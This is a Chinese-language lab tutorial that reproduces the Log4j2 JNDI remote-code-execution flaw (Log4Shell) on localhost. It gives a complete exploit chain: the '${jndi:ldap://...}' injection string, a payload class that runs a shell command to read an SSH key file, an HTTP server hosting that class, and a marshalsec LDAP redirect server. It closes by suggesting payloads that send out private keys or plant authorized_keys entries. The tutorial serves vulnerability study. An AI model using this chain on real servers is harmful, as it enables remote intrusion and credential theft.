Log4jRCE 漏洞复现
==================
影响版本：Apache Log4j 2.x <= 2.14.1
------------------
IntelliJ中新建一个工程，src文件夹下创建log4j2.xml文件，作为log4j的配置文件，控制输出的格式。注意log4j的1版本可以使用.properties后缀的文件进行配置，2版本只支持xml和json。

log4j2.xml内容：
```Java
<?xml version="1.0" encoding="UTF-8"?>
<Configuration>
    <Appenders>
        <Console name="CONSOLE" target="SYSTEM_OUT">
            <PatternLayout pattern="%d %-5p [%t] (%F:%L) - %m%n"/>
        </Console>
    </Appenders>
    <Loggers>
        <Root level="info">
            <AppenderRef ref="CONSOLE"/>
        </Root>
    </Loggers>
</Configuration>
```

然后在src文件夹下创建Log4jHack.java源文件，内容如下：
```Java
public class Log4jHack
{
    private static final Logger logger = LogManager.getLogger(Log4jHack.class);
    public static void main( String[] args )
    {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
    }
}
```

这个文件模拟的就是使用Log4j2框架的网站服务器程序。很多网站使用Java作为后端开发语言，网页中又具有提交表单的输入框，出于调试需要很可能会将输入框的内容通过logger进行输出。我们省略网页的逻辑，将输入框中的注入攻击语句直接作为参数传递给logger.error函数。

然后选择一个其他的目录（与Log4jHack.java不同目录），创建Log4jRCE.java文件。这个文件就是我们想要服务器执行的代码，我们可以在这个文件中尝试调用系统命令，这里以输出电脑的SSH公钥为例（注意：Log4j.java不要带package 包名）:

```Java
import java.io.BufferedReader;    
import java.io.IOException;    
import java.io.InputStream;    
import java.io.InputStreamReader;    
   
public class Log4jRCE {
    static {
        System.out.println("I am Log4jRCE from remote!!");
        Process p;
        String[] cmd = {"cat","/Users/Mac/.ssh/id_rsa.pub"};
        try{
            p = java.lang.Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);
            BufferedReader br = new BufferedReader(isr);
            String line = null;
            while((line = br.readLine()) != null){
                System.out.println(line);
            }
        }catch (IOException e){
            e.printStackTrace();
        }
    }
}
```

然后编译一下这个程序得到字节码文件Log4jRCE.class，命令如下：
```Java
javac Log4jRCE.java
```

然后我们在这个文件夹下打开控制台（保证服务器根目录下有Log4jRCE.class文件），启动Python自带的HTTP服务器：
```python
python3 -m http.server 127.0.0.1:8888
```

接着我们还需要在本地启动一个LDAP服务器（这两个服务器都是在攻击者电脑上的）：
```Java
git clone git@github.com:bkfish/Apache-Log4j-Learning.git
cd Apache-Log4j-Learning/tools
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
```
然后我们运行IntelliJ里的Log4jHack.java模拟注入攻击提交表单的那一刻，服务器端使用log4j2输出日志，结果为/Users/Mac/.ssh/id_rsa.pub文件内容

可以看到，机器的公钥已经在服务器上被输出了。当然这并没有什么意义，但如果我们的Log4jRCE的逻辑是通过网络通信将私钥发送给指定服务器（攻击者的电脑），或者是将攻击者的SSH公钥写入Authorized_keys文件中，那么就会出现极其严重的安全问题。

总结一下攻击过程，攻击者在网页表单的输入框里输入注入攻击语句，在提交表单时，被服务器端的Log4j框架作为日志输出，但由于该库的某些解析构造漏洞，会把${}括号中的语句作为命令执行。攻击者的注入攻击语句经过解析会先访问ldap服务器，然后由ldap解析出我们要的文件名为Log4jRCE，ldap向HTTP服务器请求获取这个文件，最后网站服务器在本地实例化并执行这个java类，即攻击者的攻击脚本得到执行。
